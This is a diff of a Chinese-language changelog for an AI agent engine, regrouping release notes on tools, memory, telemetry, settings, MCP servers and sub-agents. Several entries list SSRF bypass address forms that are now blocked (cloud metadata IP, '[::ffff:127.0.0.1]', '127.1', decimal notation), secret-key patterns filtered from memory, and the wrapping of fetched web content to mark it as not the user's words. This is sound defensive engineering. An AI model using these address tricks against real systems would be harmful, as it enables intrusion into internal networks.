+- 并发安全的工具在它的 `tool_use` 到齐时就开始跑,`tool_result` 与权限询问可能夹在同一步后面的
+  `text_delta` 之间到达。
+- 参数不是完整 JSON 的工具调用(多半是回复撞上输出上限被截断)不再以空参数 `{}` 去跑:
+  不派发,直接给它一条 `is_error` 的 `tool_result`,说明参数不完整并附上收到的开头,模型下一步
+  重新调用。`tool_use` 帧的 `input` 是 `{}`。以前这类调用拿空参数照常执行。
+- 不并发安全的工具(屏障)运行期间引擎照样读模型的流,读到的等它跑完再处理;以前这段时间
+  不读,长时间运行的工具让厂商那边的连接空等。
+- 工具调用里的 panic(只在 `panic = "unwind"` 的构建,如 `release-fast` 与 dev)变成这次调用的
+  错误结果,这一轮照常往下走;以前它让整轮失败。`release` 构建照旧中止进程。
+
+#### 压缩与记忆
+
 - 尺寸被拒之后的压缩和别的压缩是同一次压缩:跑 `PreCompact` / `PostCompact` hook
   (`trigger` 为 `"auto"`,hook 拦下就不重发、这一轮以 `ENGINE_ERROR` 结束)、配了摘要模型时
   先写摘要、补回读过的文件等提醒;被压掉的开场上下文(AGENTS.md / CLAUDE.md)下一轮重新注入。
@@ -616,44 +694,53 @@ WebAssembly 载体整个移除。
   字节计,两万个汉字(60 KB)的结果就被截成 1,000 字节;`WebFetch` 截到 50,000 字符的页面
   同样被截。工具带回的图片也算进累计的 500,000(每张按 6,400 字符),超了从最旧的清起,
   清掉的图片换成一行 `[Old tool result image cleared]`。
+- **记忆目录只有两处**:全局 `<状态目录>/memory/`(模型照提示词写的地方)与项目的
+  `<项目>/.agix/memory/`(抽取出的 `type: project`)。以前另外读的
+  `<状态目录>/memory/<cwd 的哈希>/MEMORY.md` 与 `<状态目录>/memory/<改写过的 cwd>/*.md`
+  不再读——引擎从不往那里写;手放过文件的,挪进 `<项目>/.agix/memory/`(带 frontmatter
+  的记忆格式)或项目的 `AGENTS.md`。
+- 提示词 `# Memory` 一节的索引是两处 `MEMORY.md` 合起来的,项目级的记忆也列得出来;
+  `memory_enabled: false` 时声明式场景的 `memory` 提醒也不再带索引。内置场景的每轮提醒
+  不再重复带索引(提示词里已经有)。
+- 记忆写入不再写出半截文件:按目录串行、先写临时文件再改名;召回计数在同时召回时不丢。
+- 轮末抽取的记忆里认出密钥(`sk-…`、`ghp_…`、`AKIA…`、Bearer、JWT、私钥头……)的,那一条
+  不保存。记忆存到 200 条就不再抽取新的(已有的照常更新),记一条 warn,`daemon.doctor` 的
+  `memory` 检查报 `degraded`(`count` / `cap`);引擎从不自动删记忆,腾地方要有人删掉一些。
+- 召回超出 2 秒预算时,在途的选择调用被中止,不再在后台继续花 token。
+
+#### 工具
+
+- `Bash` 超时不再丢输出:命令被停掉前打印的内容照样返回,末尾标 `[timed out after Nms]`
+  (`is_error`),结构化结果多了 `timed_out`。以前超时直接以错误结束,已打印的全丢了。
+- `Bash` 单行超过 64 KB 时截断并标 `…[line truncated]`,然后继续读后面的行;以前到那一行就
+  静默丢掉之后的全部输出。
+- 工具 `VerifyPlanExecution` 删除:它要读的计划正文从没有地方写入,调用总是报
+  "No active plan found"。
 - `WebFetch` 的正文放在 `<external-content source="…">…</external-content>` 里,后面一句
   说明它来自网页、不是用户的话;整个结果(头、定界、正文)至多 50,000 字符,截断时注明页面
   原长。`Read` 读项目外(不在项目、可写目录、`sandbox.read_directories` 之下)的文件同样这样
   包起来;脚本里调用的 `Read` 不包。按结果前缀匹配的(`[HTTP 200`、行号)不受影响,按结尾
   匹配的要改。
-- MCP server 返回的单张图片解码后超过 3.5 MB 的,换成一行 `[image omitted: …]`,不再原样
-  转给模型(超过 API 的单图上限,这一请求和之后每一个带着它的请求都会被拒)。`Read` 读超过
-  3.5 MB 的图片同样报错,不再按 10 MB 的读文件上限放行。
-- 一次调用在回复要工具之前失败,它推过的 `text_delta` 不进 transcript;重发前会再发一次同
-  `step` 的 `step_start`(协议 §7)。流在消息结尾之前断开,以前当作一个空回答正常结束
-  (`stop_reason` 为空、用量为 0),现在是 `ENGINE_ERROR`。
-- `pause_turn` 不再结束一轮:引擎把那条回复发回去让模型接着写。
-- `session.interrupt` 在模型还没开始回答时(等响应、退避重试之间)也立即生效。回复写到一半被
-  打断的一轮以 `stop_reason: "cancelled"` 结束,不再走正常收尾(`stop_reason` 为空、照跑 Stop
-  hook、送达排队消息)。
-- 并发安全的工具在它的 `tool_use` 到齐时就开始跑,`tool_result` 与权限询问可能夹在同一步后面的
-  `text_delta` 之间到达。
-- `plugin.install` / `plugin.uninstall` 的 `name`、`version` 只收 1–128 个 ASCII 字母、数字、
-  `.`、`_`、`-`、`+`,不以 `.` 开头,别的报 `INVALID_PARAMS`(以前 `{"name": "/"}` 会把根目录
-  下的目录逐个当版本删掉);`plugin.install` 还要求包里 `[plugin] name` 等于 `name`。
-- 团队的 `SendMessage` 只投给团队声明过的成员,`peer` 不在其中时报错并列出成员;提示词改成与
-  schema 一致的 `{"peer", "message"}`(以前教的 `to` / `summary` / `"*"` 广播从来不被接受)。
-  不是纯 ASCII 文件名的成员标签,邮箱文件改名为 `mailbox/~<hash>.jsonl`。
-- 同一状态目录下的两个 daemon 不能同时写一个会话:会话在一个 daemon 里活着时,另一个对它
-  `session.resume` / `session.run_turn` 报 `INTERNAL_ERROR`,消息含 "being written by another
-  process"(以前要么两边交错写进同一份日志,要么 resume 失败后换一个新 id 建会话)。
-- 会话日志最后一行写到一半(崩溃、断电)时,读的时候略过那一行而不是整份会话读不回来,
-  下一次追加前把它截掉。
-- 压缩标记(`compact` 行)写盘失败时,下一次落盘先补写它,之后的行跟在它后面;写进去了
-  只是 fsync 失败的,只重试 fsync。以前会把压缩后的消息当普通行再写一遍,日志里同样的内容
-  出现两次,恢复出来的会话前面多出一段已经被压掉的历史。
-- `config.setProvider` 不再把 `api_key` 写进项目的 `.agix/settings.json`(按约定要提交的那个):
-  它进同目录的 `settings.local.json`(0600),settings.json 里这个 provider 已有的 `api_key` 在下次
-  写入时挪过去;响应多了 `secrets_written_to`。直接读 settings.json 找 key 的,改读合并后的
-  `config.getProvider`。
-- `config.get` / `scene.describe` 的脱敏键名不分大小写,多了 `authorization` 与 `*_token` /
-  `*_secret` / `*_password`;`headers`、`env` 对象里的值一律脱敏(以前 MCP 的
-  `Authorization` 头与 stdio `env` 原样返回)。
+- **`WebFetch` 的页面抽取改走 `task_models.web_fetch`。** 以前抽取从没接上:`prompt` 被忽略,工具描述与结果头(`mode=extracted-by-haiku`)却说页面经小模型处理,还承诺了 HTTP→HTTPS 升级与 15 分钟缓存,都没实现。现在只有 `task_models.web_fetch` 配了模型才抽取(按会话的路由与 provider 调,计入录像与用量;不退回会话主模型;页面截到 80,000 字符,输出上限 2048),没配就返回页面文本。结果头报实际模式 `extracted by <模型>` 或 `page text`,抽取失败或答空时退回页面文本并在头里写明原因。重定向不跟随,返回目标。按 `mode=extracted-by-haiku` 匹配结果头的要改。
+- **`WebFetch`、`Ping` 不再能连本机与内网**:回环、私网、链路本地(含云元数据
+  `169.254.169.254`)、CGNAT、`0.0.0.0`、IPv4 映射的 IPv6 等地址,写成 IP 的、名字解析到的、
+  重定向过去的,都报 `Denied`。要让它们够到本机或内网的某个主机,把主机写进
+  `sandbox.allowed_domains`(如 `"127.0.0.1"`、`"intranet.corp"`);`network_mode` 是缺省的
+  `unrestricted` 时这份列表不限制别的主机,只起放行内部地址的作用。
+- `Grep` 搜 32 MiB 以内的文件(以前 4 MiB),更大的不读,结果末尾列出被跳过的文件;以前静默
+  跳过,报 no matches。`multiline: true` 时 `.` 匹配换行,content 模式给出匹配跨过的每一行。
+- 定时任务的 cron 表达式一直按 UTC 匹配,`CronCreate` 的说明现在也这么写,结果里带当前
+  UTC 时间。`scheduled_tasks.json` 改为原子写;读不出来的文件挪到 `scheduled_tasks.json.corrupt`
+  再从空表开始,不再被下一次保存覆盖。
+- `ExitWorktree` 的 `keep` 真的结束 worktree 会话(worktree 留在磁盘上),之后可以再
+  `EnterWorktree`;以前会话一直留在里面,下一次进入被拒。`remove` 因为有未提交改动被拒时会话
+  仍在 worktree 里,带 `discard_changes` 重试能删掉(以前 worktree 成了孤儿)。分支上有别的
+  分支与远端都没有的提交时同样拒绝删除。
+- skill 正文里的 `` !`cmd` `` 先过会话权限(按一次 `Bash` 调用):被 deny 规则拒的、要询问的
+  不再执行,替换成写明原因的一行文字。要它照跑,给那条命令写 allow 规则;项目内的只读命令照旧
+  直接执行。skill 自己的 `allowed-tools` 不覆盖它自己的 `` !`cmd` ``。
+- 运行中新建或改动的 `<project>/.agents/skills/` 下的 skill 按项目 skill 对待(不带内容的
+  `allowed-tools` 授权不生效),即使用户层有同名的 skill。以前热重载把它记成用户 skill。
 - skill 文件热重载时按文件所在的层定来源:项目层 `.agents/skills/` 里新出现或改动的 skill
   一律是 project 来源(以前不认识的名字一律当 user,项目里的 `allowed-tools: [Bash]` 因此免确认);
   不在任何扫描层下的文件同样按 project;后面的层占着同名 skill 时,前面层的改动不再顶替它;
@@ -668,81 +755,78 @@ WebAssembly 载体整个移除。
   不再带 frontmatter(以前磁盘上的 skill 连 `---` 头一起交给模型)。
 - 插件包带来的 skill 与项目 skill 一样,只写工具名的整类 `allowed-tools` 授权不生效,要写成
   `Tool(内容)`。
-- **记忆目录只有两处**:全局 `<状态目录>/memory/`(模型照提示词写的地方)与项目的
-  `<项目>/.agix/memory/`(抽取出的 `type: project`)。以前另外读的
-  `<状态目录>/memory/<cwd 的哈希>/MEMORY.md` 与 `<状态目录>/memory/<改写过的 cwd>/*.md`
-  不再读——引擎从不往那里写;手放过文件的,挪进 `<项目>/.agix/memory/`(带 frontmatter
-  的记忆格式)或项目的 `AGENTS.md`。
-- 提示词 `# Memory` 一节的索引是两处 `MEMORY.md` 合起来的,项目级的记忆也列得出来;
-  `memory_enabled: false` 时声明式场景的 `memory` 提醒也不再带索引。内置场景的每轮提醒
-  不再重复带索引(提示词里已经有)。
-- 记忆写入不再写出半截文件:按目录串行、先写临时文件再改名;召回计数在同时召回时不丢。
-- 轮末抽取的记忆里认出密钥(`sk-…`、`ghp_…`、`AKIA…`、Bearer、JWT、私钥头……)的,那一条
-  不保存。记忆存到 200 条就不再抽取新的(已有的照常更新),记一条 warn,`daemon.doctor` 的
-  `memory` 检查报 `degraded`(`count` / `cap`);引擎从不自动删记忆,腾地方要有人删掉一些。
-- 召回超出 2 秒预算时,在途的选择调用被中止,不再在后台继续花 token。
-- 模型请求在开始回答之前收到 500 / 502 / 504 / 408 的,按退避再发(两个协议都是),和 429、
-  503、529 一样;以前直接失败。
-- Anthropic 的 `base_url` / `ANTHROPIC_BASE_URL` 写到 `…/v1` 或写全 `…/v1/messages` 都可以,
-  不再拼成 `…/v1/v1/messages`。
-- OpenAI 兼容 provider 报回的 `input_tokens` 不再含已缓存的那部分(那部分在
-  `cache_read_input_tokens`),和 Anthropic 的含义一致;以前缓存命中的部分算了两遍,
-  `context.tokens` 与按 token 估的花费都偏大。
-- Anthropic 原生搜索不再带 `anthropic-beta: web-search-20250305-2025-03-05`(`web_search_20250305`
-  不需要 beta)。
-- `session.delete`,以及 `session.close` / `session.delete` 级联删掉的会话,连同
-  `sessions/<id>/` 整个目录一起删(会话记忆、metadata、输入历史);以前只删 `metadata.json`。
-  会话还在本 daemon 里活着时只留下空的 `writer.lock`。
-- `ExitWorktree` 的 `keep` 真的结束 worktree 会话(worktree 留在磁盘上),之后可以再
-  `EnterWorktree`;以前会话一直留在里面,下一次进入被拒。`remove` 因为有未提交改动被拒时会话
-  仍在 worktree 里,带 `discard_changes` 重试能删掉(以前 worktree 成了孤儿)。分支上有别的
-  分支与远端都没有的提交时同样拒绝删除。
-- `Grep` 搜 32 MiB 以内的文件(以前 4 MiB),更大的不读,结果末尾列出被跳过的文件;以前静默
-  跳过,报 no matches。`multiline: true` 时 `.` 匹配换行,content 模式给出匹配跨过的每一行。
-- 定时任务的 cron 表达式一直按 UTC 匹配,`CronCreate` 的说明现在也这么写,结果里带当前
-  UTC 时间。`scheduled_tasks.json` 改为原子写;读不出来的文件挪到 `scheduled_tasks.json.corrupt`
-  再从空表开始,不再被下一次保存覆盖。
-- 新帧 `notification`(`{message,status}`,协议 §7):模型调用 `PushNotification` 时发给会话的
-  订阅者,同时触发 `Notification` hook(`reason` 为通知正文,`tool_name` 为
-  `PushNotification`)。宿主该把它当通知送到用户面前;macOS 上引擎所在的机器仍顺带弹一条
-  桌面通知,失败不算错。
-- `/cost` 报的是会话自载入以来模型调用数、工具调用数和厂商报回的四项 token,不再是按字符数
-  估的美元数。
+- `Agent` 工具的 schema 去掉从未生效的 `auto_background_after_secs`。子 Agent 因 `max_turns`
+  停下时,交回父会话的结果里写明这一点(以前可能是一个空结果)。`TeamCreate` 的结果不再带
+  协调者的 ROLE/TOOLS 说明段。
+- 在会话自己的工作树(`EnterWorktree` 建在 `.agix/worktrees/<名字>/` 下)里写文件、跑命令
+  不再当作改 agent 配置去询问,按项目里的普通文件判;无人值守会话以前在工作树里一写就被拒。
+  工作树里的 `.agix`、`.claude`、`.git` 照旧要确认。
+- 带 `output_schema` 的 `session.startAgent` 子 Agent 交结果(`StructuredOutput`)不再询问宿主:
+  会话本身没有 schema 时没有这个工具,以前子 Agent 的调用按"未知工具"去问,无人答就一直等着。
+  现在子 Agent 的调用按它自己那份工具判,父会话的规则照旧适用(deny 了 `StructuredOutput`
+  的照样拒)。
+- 启动时还不存在的 skill 目录(项目第一次建出 `.agents/skills/`)里后来写进的 skill 能用上了:
+  下一次有请求用到这个项目的配置(`commands.list`、建会话等)时按新出现的目录重载,运行中的会话
+  在下一轮之前重建,这个目录此后也被监视。以前只有显式 `config.reload` 或重启才看得到。
+
+#### 遥测
+
 - 遥测(`telemetry/<session>.jsonl`、`pool.jsonl`、OTel)`schema_version` 升为 2:payload 不再
   重复信封的 `turn_no` / `turn_id`;从来没有发出过的 15 种事件删除(`config_loaded`、
   `tool_decision`、`intent_classified`、`interrupt_signal`、`context_window_report`、
   `model_route`、`error_record`、`mcp_server_disconnected`、`mcp_tool_call`、`agent_message`、
   `memory_snapshot`、`file_operation`、`tui_action`、`hook_execution`、`outcome_record`),
-  剩 22 种;`api_error`、`permission_decision`、
+  再加上下面去掉的 `shutdown_signal`,共去掉 16 种,剩 21 种;`api_error`、`permission_decision`、
   `user_prompt_submit`、`slash_command_used` 现在会发,`mcp_server_connected` /
   `mcp_connection_error` / `startup_timing` 记进 `pool.jsonl`;`Agent` 工具的子 Agent 记
   `agent_spawned` / `agent_completed`。`session_end` 的 token 与调用合计是真数,去掉
   `total_cost_usd` 与 `total_errors`;`startup_timing` 只剩 `total_startup_ms`、`config_load_ms`、
   `pool_build_ms`。遥测文件到 64 MiB 轮转到 `<file>.1`。录像目录与文件只有属主可读写。
-- `Agent` 工具的 schema 去掉从未生效的 `auto_background_after_secs`。子 Agent 因 `max_turns`
-  停下时,交回父会话的结果里写明这一点(以前可能是一个空结果)。`TeamCreate` 的结果不再带
-  协调者的 ROLE/TOOLS 说明段。
-- **`options` 逐字段读,被忽略的报在响应里。** `session.create` / `session.run_turn` /
-  `session.resume` 的 `options` 里不认识的字段、值读不出来的字段(`"permission_mode": "plann"`)
-  被忽略、其余照常生效,列在 `result.ignored_options`(`[{field, error}]`)里并记 warn。以前一个
-  字段错了整份 `options` 悄悄当没传,`permission_mode`、`permission_rules` 一起丢掉。**下一个版本
-  起改为拒绝**(`INVALID_PARAMS`),现在就该把 `ignored_options` 当错误处理。
-- 会话建不回来时(例如它记录的 `provider` 已不在配置里),`session.run_turn` / `session.resume`
-  报 `INTERNAL_ERROR`,不再换一个新 id、在默认项目和默认场景里建会话顶替(以前 `run_turn`
-  会在那个新会话里照常跑完这一轮,结果的 `session_id` 不是请求里的那个)。
-- 没有 `id` 的请求(通知)不再收到响应帧,出错和 `TOO_MANY_IN_FLIGHT` 也不回。靠无 `id` 请求
-  拿结果的客户端要带上 `id`。
-- `daemon.shutdown`、SIGINT / SIGTERM 先停止接受新连接再关会话;关停期间已连着的连接上新建或
-  带回内存会话报错 `the daemon is shutting down`。以前关停的那几秒里还能建出会话来。
-- Unix socket 建好后改成 `0600`,daemon 为它新建的目录是 `0700`;以前随 umask(通常 `0755`)。
-  别的用户本来就连不上(没有写权限),放宽了 umask 的部署才受影响。
-- `daemon.lock` 在 daemon 运行期间持有 `flock`:两个 daemon 同时启动只有一个能起来,另一个报
-  "another daemon is already running"。以前两个可能都起来,后起的删掉先起的那个的 socket。
-- 被驱逐的会话再用时,先等它旧的运行体停下(`SessionEnd` hook 跑完,最多 5 秒)再重建;以前
-  旧的 `SessionEnd` hook 可能和重建出来的会话的 `SessionStart` 同时在跑。
-- `--listen` 绑定非回环地址时启动打一条 warn:TCP 不加密,token 明文传输。
+- 遥测去掉 `shutdown_signal`(剩 21 种):它紧跟 `session_end` 发,`reason` / `duration_ms` /
+  `total_turns` 与 `session_end` 重复,`had_errors` / `exit_code` 恒为 `false` / `0`。用
+  `session_end` 的 `stop_reason`。
+- `tool_execution` 的字段是真数:`input_json_size`、`result_content_size`(结果文本的字节数)
+  以前恒为 0;`user_approved` 只在这次调用问过人、人答应了时为 `true`(以前恒为 `true`);
+  失败时有 `error_message`(以前从不出现;daemon 写出前照旧换成 `[REDACTED]`)。
+- 遥测文件(`telemetry/<session>.jsonl`、`pool.jsonl`、`options.telemetry.output`)只有属主可读写
+  (`0600`,已有的文件打开时也收紧),为它们新建的目录是 `0700`;以前随 umask。
+- 常驻团队成员也记 `agent_spawned`(`background: true`)/ `agent_completed`(成员停下时)遥测。
+- **OTel 导出器是进程级的**:一个 daemon 只起一个,会话结束只 flush、不再关掉它(以前第一个结束的会话关掉全局 provider,之后整个 daemon 不再导出任何指标与 span)。同一进程里第二个 pool 配了不同的 `endpoint` 时,以先起的那个为准,后者被忽略(记一条 warn);daemon 在监听器退出后 flush 并停掉它。
+- `--features otel` 构建的 OTLP/HTTP 导出(端口不是 4317 的端点)以前什么也没发出去——没有
+  HTTP 客户端,建导出器时就失败了,只记一条 warn。现在照常发送,端点按 collector 的根地址处理:
+  trace 发到 `<端点>/v1/traces`,指标发到 `<端点>/v1/metrics`。原来写成
+  `http://collector:4318/v1/traces` 这种带信号路径的,改成根地址。
+
+#### 设置文件
+
+- **`feature_flags` 整段删除。** 还在起作用的两项挪进 `compaction`:`reactive_compact` 改成
+  `compaction.reactive`,`cached_microcompact` 改成 `compaction.cached_microcompact`,含义不变、
+  默认都关。`feature_flags` 留在配置里照样能加载,但整段被忽略——开着这两项的要搬过去。
+  `team_mode`、`plugin_marketplace`、`extended_memory`、`experimental_agent`、
+  `recorder_auto_detect`、`dream_task` 从来没有生效;`AGIX_FEATURE_*` 环境变量同样从未生效。
 - settings.json 里没有任何设置读的顶层键(拼错的、别的工具的,如 `hooks`)在加载时各记一条
   warn,`daemon.doctor` 的 `settings_tiers[]` 多了 `unknown_keys`。行为不变,仍被忽略。
+- `config.setProvider`、`mcp.addServer` / `updateServer`、`project.trust` 与权限询问里的"永久
+  允许"改设置文件时上锁(跨进程也互斥)、写临时文件再改名替换;`settings.local.json` 每次写都是
+  0600(以前"永久允许,本项目"会把它改成 umask 权限,通常是 0644)。设置文件是符号链接的,
+  这些写入都拒绝(`INVALID_PARAMS` / 报错),不再顺着链接写目标文件;用 dotfile 链接管理
+  `~/.agix/settings*.json` 的,要么改目标文件,要么换成普通文件。
+- `config.setProvider` 不再把 `api_key` 写进项目的 `.agix/settings.json`(按约定要提交的那个):
+  它进同目录的 `settings.local.json`(0600),settings.json 里这个 provider 已有的 `api_key` 在下次
+  写入时挪过去;响应多了 `secrets_written_to`。直接读 settings.json 找 key 的,改读合并后的
+  `config.getProvider`。
+- `mcp.addServer` / `mcp.updateServer` 不再把密钥写进要提交的 settings.json:`config` 的
+  `headers` 与 `env` 写进同目录的 `settings.local.json`(0600),其余照旧写 settings.json,响应多了
+  `secrets_written_to`(改了 settings.local.json 时才有)。settings.json 里这个 server 早先写进去的
+  `headers` / `env` 在下次写它时被替换掉;已经提交过的,记得轮换。`mcp.updateServer` 认只在
+  settings.local.json 里声明的 server。
+- `config.get` / `scene.describe` 的脱敏键名不分大小写,多了 `authorization` 与 `*_token` /
+  `*_secret` / `*_password`;`headers`、`env` 对象里的值一律脱敏(以前 MCP 的
+  `Authorization` 头与 stdio `env` 原样返回)。
+
+#### 插件与脚本
+
+- **DSH 桥移除。** 引擎不再带 DSH 桥(0.2.7 起有的 `bridges/agix-dsh-bridge`,Node.js 进程),环境变量 `AGIX_DSH_BRIDGE` 一并删除。插件包里 `[[mcp]] kind = "dsh"` 在安装与发现时都被拒,报错给出新写法:把插件做成 stdio MCP 服务器,用 `kind = "native"` 声明。适配外部插件框架由上层用 Rust 插件、`x-` 段或 native MCP 实现(建议已提给 Harnix:openatta/Harnix#65)。
 - `plugin.install` 披露里有超限文本(描述 > 500 字符、提示词 > 40 000 字符)的包被拒
   (`INVALID_PARAMS`)并删掉,不再是 `success: true` 加 `disclosure: {"error": …}`;agent 的
   `prompt` 读不到、MCP 的 `config` 读不到或不是 JSON 的包同样装不上。同一版本已经装过的也
@@ -767,80 +851,8 @@ WebAssembly 载体整个移除。
   空位;程序结束后不理会取消的子调用最多再等 `stop_grace`(10 秒)就丢下,不再让结果一直
   挂着;时限改用单调时钟。
 
-- **MCP 策略里 `allowed_servers` 的 `name` 规则不再放行任何 server**,`name` 只在
-  `denied_servers` 里起作用。只靠 `{"name": …}` 放行的策略现在拒绝这些 server(拒绝原因会说
-  明),`daemon.doctor` 的 `mcp.policy` 报 `degraded` 并在 `inert_allowed_rules` 里列出它们;
-  改成 `command` / `url` 规则。`url` 规则匹配前把 `ws://` / `wss://` 当作 `http://` /
-  `https://`、去掉主机名末尾的 `.`(规则里写的 `ws://` / `wss://` 同样换过来),
-  `denied_servers` 因此也拦得住 WebSocket 回退和 `evil.example.` 这种写法。
-- **项目层的 MCP server 读不了 daemon 的环境。** 项目 `.agix/settings.json` /
-  `settings.local.json` 里声明或改过的 server——包括 `mcp.addServer` / `mcp.updateServer` 写进去
-  的——`command` / `args` / `url` / `headers` 里的 `$VAR` 只用它自己 `env` 块的值展开,`env` 块
-  的值本身不展开;`oauth` 里写 `client_secret_env` / `private_key_jwt.key_env` 的不连接
-  (`mcp_connect_failed`,`mcp.addServer` 报 `INVALID_PARAMS`)。靠 `$GITHUB_TOKEN` 这类变量的
-  项目 server,把值写成字面量,或把 server 挪到全局层 / 场景层;全局层、场景层、插件声明的
-  server 照旧。项目放在 `$HOME`、`.agix` 就是全局目录的,按全局层算。
-- `"type": "in_process"` 的 MCP server 配置不再被接受(从来没有实现过,连接必然失败),以
-  `invalid config` 报出。`"type": "websocket"` 现在与 `web_socket` 同义。
-- server 名含 `__` 或以 `_` 结尾的 MCP server,工具名改走"清洗 + 哈希"(`a__b` 的工具叫
-  `mcp__a_b_<6 位哈希>__…`),本来就要哈希、清洗后以 `_` 结尾的名字(如 `docs.`)也不再带那个
-  `_`。写了这些 server 的权限规则要跟着改名。
-- 工具调用之后不再把每个 MCP server 的工具都重列一遍:只有发了 `tools/list_changed`(或断线
-  后重连上)的 server 才在下一步重列,发了 `prompts/list_changed` 的重读它的 prompt;
-  `resources/list_changed` 不触发任何事。重列失败的 server 保留原来的工具,不再让整组工具
-  消失;重列得到空列表的,工具清空。
-- `config.reload` 的 `routing` 多了 `mcp_connecting`:重连最多等 10 秒,没连完的在后台接着连,
-  结果随后以通知到达。命令不存在、没有执行权限、URL 解析不了的 MCP server 不再退避重试
-  (以前每个要等十几秒)。
-- 消息里 `@server:uri` 内联的资源:`server` / `uri` 属性做了转义,正文里的 `</mcp-resource`
-  被拆开,资源伪造不了闭合标签;MIME 不是 `image/*` 的二进制资源显示为
-  `[binary resource: <mime>, <n> bytes]`,不再标成图片。
-- MCP OAuth 回调带 `error` 时同样要求 `state` 相符;不符的被拒,登录继续等真正的回调。以前
-  任何本机进程发一个 `?error=x` 就能把进行中的登录作废。
-- MCP stdio server 的进程组记进孤儿登记:daemon 被 `SIGKILL` 之后,下次启动会把它们清掉。
-- 只读且幂等的 MCP 工具结果超过 256 KB 的不再缓存。
-- 登录之后重连失败的 `mcp_connect_failed` 的 `error` 带上失败原因。
-- **command hook 的退出码按 0 / 2 / 其他来读**(`extension_points.md` 生命周期 hook 一节)。
-  `exit 2` 一律拦下,理由取 stderr(为空取 stdout),stdout 不再当 JSON 读——以前 `exit 2`
-  同时往 stdout 打了不是 JSON 的东西就被放行。`exit 1` 等其他非零放行并记 warn——以前
-  非零退出、stdout 为空就拦下。靠 `exit 1` 拦的 hook 改成 `exit 2`。
-- 没写 `timeout` 的 hook 最多跑 60 秒(以前 10 分钟);agent 型 hook 的 `timeout` 以前不生效,
-  现在生效。要更久的写明 `timeout`。
-- `if` 的 `""` 与 `"*"` 命中一切(以前什么都不命中,hook 从不跑);`Edit|Write` 几选一;prompt、
-  http、agent 三种 hook 也认 `if`(以前被忽略,对所有调用都跑)。
-- `once` 只在 hook 真正跑了之后才算用掉;以前 `if` 没命中的那次调用就把它用掉了。
-- 超时、出错的 hook 在日志里记一条 warn(以前除了 command 超时都没有痕迹)。
-- **`WebFetch`、`Ping` 不再能连本机与内网**:回环、私网、链路本地(含云元数据
-  `169.254.169.254`)、CGNAT、`0.0.0.0`、IPv4 映射的 IPv6 等地址,写成 IP 的、名字解析到的、
-  重定向过去的,都报 `Denied`。要让它们够到本机或内网的某个主机,把主机写进
-  `sandbox.allowed_domains`(如 `"127.0.0.1"`、`"intranet.corp"`);`network_mode` 是缺省的
-  `unrestricted` 时这份列表不限制别的主机,只起放行内部地址的作用。
-- HTTP hook 防内网的检查补全:`0.0.0.0`、`[::ffff:127.0.0.1]`、`127.1`、十进制写法、带
-  `user@` 的 url、IPv6 私有段与 CGNAT 都拒;重定向的每一跳都查。
-- **`Stop` hook 的 `decision: "block"`(或 command `exit 2`)不再被忽略**:这一轮不结束,
-  `message` 作为提醒交给模型接着做;再停下时 `Stop` 再问一遍,payload 带 `stop_hook_active: true`。
-  只想记录的 `Stop` hook 若回了 `block`,现在会让模型多跑一轮。
-- `TaskCompleted` / `TeammateIdle` 现在会发:团队成员(`TeamCreate` 的、`Agent` 带 `team_name`
-  的)一轮结束时,payload 带 `team_name`、`teammate_name`;`TaskCompleted` 只在正常结束时发。
-  不再要求配了 `Stop` hook。
-- 子 Agent 用父会话的 hooks:`once` 在整棵会话树里只算一次(以前每个子 Agent 各算一次),
-  `FileChanged` 一次修改只触发一次(以前每起过一个子 Agent 就多触发一次)。`SubagentStart` /
-  `SubagentStop` 在后台 `Agent`、`context: fork` 的 skill、`session.startAgent`、常驻团队成员上
-  也会发(以前只有前台 `Agent` 与 `TeamCreate`);常驻成员的 `SubagentStop` 在它被停掉时发,
-  `stop_reason` 为 `shutdown`;取消的子 Agent 报 `cancelled`。
-- `FileChanged` 也监视会话载入的 `AGENTS.md`(以前只看显式的 `instruction_file`)。
-- hook payload 的 `permission_mode`、`cwd` 不再为空:工具分发里发的 `PostToolUseFailure`、
-  `PermissionRequested`、`PermissionDenied`、`Notification`、`WorktreeCreate/Remove` 以及
-  `TaskCreated` 带上会话当前的模式;`SubagentStart/Stop` 带子 Agent 自己的 cwd 与模式;
-  `FileChanged`、`Elicitation` 与 rewake 的 `WakeEvent` 带上会话 id、项目根与模式(以前
-  `session_id` 为空、`cwd` 是 daemon 进程的工作目录或空、模式写死 `default`)。
-- 参数不是完整 JSON 的工具调用(多半是回复撞上输出上限被截断)不再以空参数 `{}` 去跑:
-  不派发,直接给它一条 `is_error` 的 `tool_result`,说明参数不完整并附上收到的开头,模型下一步
-  重新调用。`tool_use` 帧的 `input` 是 `{}`。以前这类调用拿空参数照常执行。
-- 不并发安全的工具(屏障)运行期间引擎照样读模型的流,读到的等它跑完再处理;以前这段时间
-  不读,长时间运行的工具让厂商那边的连接空等。
-- 工具调用里的 panic(只在 `panic = "unwind"` 的构建,如 `release-fast` 与 dev)变成这次调用的
-  错误结果,这一轮照常往下走;以前它让整轮失败。`release` 构建照旧中止进程。
+#### 子 Agent 与团队
+
 - 常驻团队成员(`Agent` 带 `team_name` + `name`)的上限 `execution.team_max_persistent_members`
   是硬的:要新建成员时先回收最久空闲的,腾出一个位置;全都在忙就拒绝(`Denied`,"team member
   limit reached"),给已有成员发消息不受影响。以前全忙时照样新建,稳态比上限多一个。
@@ -848,62 +860,72 @@ WebAssembly 载体整个移除。
   工具,团队成员同样受限。以前写死 3。
 - 父会话结束时(关闭、删除、被驱逐、daemon 停止),它的常驻团队成员随之停下,正在跑的那一轮
   也被取消。以前成员不受会话结束影响,在途的一轮照跑完,空闲的一直留着。
-- 常驻团队成员也记 `agent_spawned`(`background: true`)/ `agent_completed`(成员停下时)遥测。
-- 遥测去掉 `shutdown_signal`(剩 21 种):它紧跟 `session_end` 发,`reason` / `duration_ms` /
-  `total_turns` 与 `session_end` 重复,`had_errors` / `exit_code` 恒为 `false` / `0`。用
-  `session_end` 的 `stop_reason`。
-- `tool_execution` 的字段是真数:`input_json_size`、`result_content_size`(结果文本的字节数)
-  以前恒为 0;`user_approved` 只在这次调用问过人、人答应了时为 `true`(以前恒为 `true`);
-  失败时有 `error_message`(以前从不出现;daemon 写出前照旧换成 `[REDACTED]`)。
-- 遥测文件(`telemetry/<session>.jsonl`、`pool.jsonl`、`options.telemetry.output`)只有属主可读写
-  (`0600`,已有的文件打开时也收紧),为它们新建的目录是 `0700`;以前随 umask。
-- **`PreToolUse` hook 答 `decision: "approve"` 就不再问人**:权限检查要询问的调用直接放行
-  (无人值守会话同样),规则拒绝的照样拒绝,别的 hook 说 `block` 照样拦。以前 `approve` 解析了
